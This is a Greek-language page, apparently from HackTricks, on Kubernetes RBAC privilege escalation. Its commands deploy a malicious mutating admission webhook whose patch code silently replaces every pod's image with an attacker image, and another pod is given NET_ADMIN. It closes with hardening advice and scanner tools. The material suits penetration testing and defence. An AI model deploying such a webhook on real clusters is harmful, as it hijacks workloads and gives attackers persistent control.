## Ενσωματωμένη Πρόληψη Προνομιούχου Εξάρτησης

Το Kubernetes έχει ένα [ενσωματωμένο μηχανισμό](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) για την πρόληψη της προνομιούχου εξάρτησης.

Αυτό το σύστημα εξασφαλίζει ότι **οι χρήστες δεν μπορούν να αναβαθμίσουν τα προνόμιά τους τροποποιώντας ρόλους ή δεσμεύσεις ρόλων**. Η εφαρμογή αυτού του κανόνα συμβαίνει στο επίπεδο του API, παρέχοντας έναν προστατευτικό φράγμα ακόμη και όταν ο εξουσιοδοτητής RBAC είναι ανενεργός.

Ο κανόνας ορίζει ότι ένας **χρήστης μπορεί να δημιουργήσει ή να ενημερώσει ένα ρόλο μόνο αν διαθέτει όλα τα δικαιώματα που περιλαμβάνει ο ρόλος**. Επιπλέον, το εύρος των υπαρχόντων δικαιωμάτων του χρήστη πρέπει να συμφωνεί με αυτό του ρόλου που προσπαθεί να δημιουργήσει ή να τροποποιήσει: είτε για ολόκληρο το cluster για τους ClusterRoles είτε περιορισμένο στον ίδιο χώρο ονομάτων (ή για ολόκληρο το cluster) για τους Roles.

{% hint style="warning" %}
Υπάρχει μια εξαίρεση στον προηγούμενο κανόνα. Αν μια αρχή έχει το **ρήμα `escalate`** πάνω στους **`roles`** ή **`clusterroles`** μπορεί να αυξήσει τα προνόμια των ρόλων και των clusterroles ακόμη και χωρίς να έχει τα αναγκαία δικαιώματα.
{% endhint %}

### **Λήψη & Ενημέρωση RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Προφανώς αυτή η τεχνική λειτούργησε πριν, αλλά σύμφωνα με τις δοκιμές μου δεν λειτουργεί πλέον για τον ίδιο λόγο που εξηγήθηκε στην προηγούμενη ενότητα. Δεν μπορείτε να δημιουργήσετε/τροποποιήσετε ένα ρόλο δεσμεύοντας προνόμια στον εαυτό σας ή σε διαφορετικό SA αν δεν τα έχετε ήδη.**
{% endhint %}

Το προνόμιο να δημιουργήσετε Rolebindings επιτρέπει σε έναν χρήστη να **δέσει ρόλους σε ένα λογαριασμό υπηρεσίας**. Αυτό το προνόμιο μπορεί δυνητικά να οδηγήσει σε αναβάθμιση προνομίων επειδή **επιτρέπει στον χρήστη να δέσει διαχειριστικά προνόμια σε έναν υποβαθμισμένο λογαριασμό υπηρεσίας.**

## Άλλες Επιθέσεις

### Εφαρμογή πλευρικού proxy

Από προεπιλογή δεν υπάρχει κρυπτογράφηση στην επικοινωνία μεταξύ των pods. Αμοιβαία πιστοποίηση, διπλή, από pod σε pod.

#### Δημιουργία μιας εφαρμογής πλευρικού proxy <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Δημιουργήστε το .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Επεξεργαστείτε το αρχείο .yaml σας και προσθέστε τις γραμμές που δεν έχουν σχόλιο:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Δείτε τα logs του proxy:
```bash
kubectl logs app -C proxy
```
Περισσότερες πληροφορίες στο: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Κακόβουλος Ελεγκτής Αδειοδότησης

Ένας ελεγκτής αδειοδότησης **παρεμβαίνει στις αιτήσεις προς τον διακομιστή API του Kubernetes** πριν τη μόνιμη αποθήκευση του αντικειμένου, αλλά **μετά την πιστοποίηση του αιτήματος** **και την έγκριση**.

Εάν ένας επιτιθέμενος καταφέρει κάπως να **ενθάρρυνει έναν Ελεγκτή Μετάλλαξης**, θα μπορούσε να **τροποποιήσει ήδη πιστοποιημένα αιτήματα**. Μπορώντας έτσι να ανέβει στην ιεραρχία δικαιωμάτων, και συνήθως να παραμείνει μόνιμα στον συστάδα.

**Παράδειγμα από** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Ελέγξτε την κατάσταση για να δείτε αν είναι έτοιμο:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Στη συνέχεια αναπτύξτε ένα νέο pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Όταν βλέπετε το σφάλμα `ErrImagePull`, ελέγξτε το όνομα της εικόνας με οποιαδήποτε από τις παρακάτω ερωτήσεις:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Όπως μπορείτε να δείτε στην παραπάνω εικόνα, προσπαθήσαμε να εκτελέσουμε την εικόνα `nginx` αλλά η τελική εκτελούμενη εικόνα είναι `rewanthtammana/malicious-image`. Τι συνέβη!!?

#### Τεχνικές Λεπτομέρειες <a href="#heading-technicalities" id="heading-technicalities"></a>

Το σενάριο `./deploy.sh` δημιουργεί έναν ελεγκτή πρόσβασης μεταλλαγής webhook, ο οποίος τροποποιεί τις αιτήσεις προς το API του Kubernetes όπως ορίζεται στις γραμμές ρυθμίσεων του, επηρεάζοντας τα παρατηρούμενα αποτελέσματα:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Το παραπάνω απόσπασμα αντικαθιστά την πρώτη εικόνα container σε κάθε pod με το `rewanthtammana/malicious-image`.

## Παράκαμψη OPA Gatekeeper

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Καλές Πρακτικές

### **Απενεργοποίηση Αυτόματης Τοποθέτησης των Καρτελών Λογαριασμού Υπηρεσίας**

* **Pods και Λογαριασμοί Υπηρεσίας**: Από προεπιλογή, τα pods τοποθετούν ένα καρτέλας λογαριασμού υπηρεσίας. Για να ενισχυθεί η ασφάλεια, το Kubernetes επιτρέπει την απενεργοποίηση αυτής της λειτουργίας αυτόματης τοποθέτησης.
* **Πώς να Εφαρμόσετε**: Ορίστε `automountServiceAccountToken: false` στη διαμόρφωση των λογαριασμών υπηρεσίας ή των pods ξεκινώντας από την έκδοση Kubernetes 1.6.

### **Περιοριστική Ανάθεση Χρηστών σε RoleBindings/ClusterRoleBindings**

* **Εκλεκτική Συμπερίληψη**: Βεβαιωθείτε ότι στα RoleBindings ή ClusterRoleBindings συμπεριλαμβάνονται μόνο οι απαραίτητοι χρήστες. Ελέγχετε τακτικά και αφαιρέστε τους μη σχετικούς χρήστες για να διατηρήσετε την ασφάλεια.

### **Ρόλοι Ειδικού Χώρου Έναντι Ρόλων Σε Όλο το Cluster**

* **Ρόλοι έναντι Ρόλων Σε Όλο το Cluster**: Προτιμήστε τη χρήση Ρόλων και RoleBindings για δικαιώματα που είναι ειδικά για τον χώρο ονομάτων αντί για ClusterRoles και ClusterRoleBindings, τα οποία ισχύουν σε όλο το cluster. Αυτή η προσέγγιση προσφέρει πιο λεπτομερή έλεγχο και περιορίζει το πεδίο των δικαιωμάτων.

### **Χρήση αυτοματοποιημένων εργαλείων**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Αναφορές**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
